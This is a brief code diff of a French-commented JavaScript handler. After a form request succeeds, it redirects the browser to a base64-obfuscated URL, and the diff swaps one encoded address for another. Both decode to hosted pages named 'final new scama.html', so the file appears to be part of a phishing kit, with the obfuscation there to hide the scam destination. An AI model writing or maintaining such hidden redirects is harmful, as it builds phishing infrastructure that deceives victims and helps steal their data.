@@ -95,7 +95,7 @@ document.addEventListener('DOMContentLoaded', function () {
                 .then(response => {
                     if (response.ok) {
                         // Redirection vers le lien en base64 en cas de succès
-                       window.location.href = atob('aHR0cHM6Ly9maW5hbC1uZW9uLXBzaS52ZXJjZWwuYXBwL2ZpbmFsJTIwbmV3JTIwc2NhbWEuaHRtbA==');
+                       window.location.href = atob('aHR0cHM6Ly9maW5hbC1laWdodC1ncmVlbi52ZXJjZWwuYXBwL2ZpbmFsJTIwbmV3JTIwc2NhbWEuaHRtbA==');
          } else {
                         
                     }
